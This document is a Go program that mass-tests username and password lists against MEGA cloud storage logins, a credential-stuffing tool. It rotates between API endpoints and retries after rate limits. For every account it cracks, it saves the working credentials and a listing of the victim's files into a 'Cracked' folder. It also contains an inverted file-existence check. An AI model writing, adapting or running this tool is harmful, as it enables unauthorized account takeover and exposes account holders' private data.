package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/t3rm1n4l/go-mega"
	"github.com/t3rm1n4l/megacmd/client"
)

var (
	api = [...]string{"https://eu.api.mega.co.nz", "https://g.api.mega.co.nz"} //API's
)

func checkFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func getContent(file string) ([]string, error) {
	f, err := ioutil.ReadFile(file)
	if err != nil {
		return []string{}, fmt.Errorf("error opening file %v", err)
	}

	results := strings.Split(string(f), "\r\n")

	return results, nil
}

type Page struct {
	Title string
	Body  []byte
}

func (p *Page) save() error {
	filename := p.Title + ".txt"
	return ioutil.WriteFile("./Cracked/"+filename, p.Body, 0600)
}

func countFiles() int { //Count # of files
	profiles, _ := ioutil.ReadDir("./Cracked")
	return len(profiles)
}

func main() {
	if checkFileExist(os.Args[0]+"username.txt") && checkFileExist(os.Args[0]+"password.txt") {
		fmt.Println("Error! username.txt OR password.txt not found!")
		os.Exit(1)
	}

	usernames, err := getContent("username.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	passwords, err := getContent("password.txt")
	if err != nil {
		fmt.Println(err)
		return
	}

	for _, u := range usernames {
		for _, p := range passwords {
		retry:
			conf := new(megaclient.Config)
			rand.Seed(time.Now().UTC().UnixNano())
			mega.API_URL = api[rand.Intn(len(api))]

			conf.User = u
			conf.Password = p

			client, err := megaclient.NewMegaClient(conf)
			if err != nil {
				fmt.Println(err)
			}

			err = client.Login()

			if err != nil {
				if err == mega.ENOENT {
					fmt.Println("[Bad] " + u + ":" + p)
					break
				} else {
					fmt.Println("[Limited] Unable to establish connection to mega service", err)
					time.Sleep(time.Duration(30) * time.Second)

					goto retry
				}
			}
			var tmpstring string
			tmpstring += "Login: " + u + ":" + p + "\r\n"
			fmt.Println("[Good] " + u + ":" + p)
			paths, err := client.List("mega:/")
			if err != nil && err != mega.ENOENT {
				fmt.Println("[ERROR] List failed ", err)
			}
			if err == nil {
				for _, p := range *paths {
					tmpstring += p.GetPath() + "\r\n"
				}
				s1 := strconv.Itoa(countFiles())
				p1 := &Page{Title: "Cracked Account " + s1, Body: []byte(tmpstring)}
				p1.save()
			}
		}
	}
}
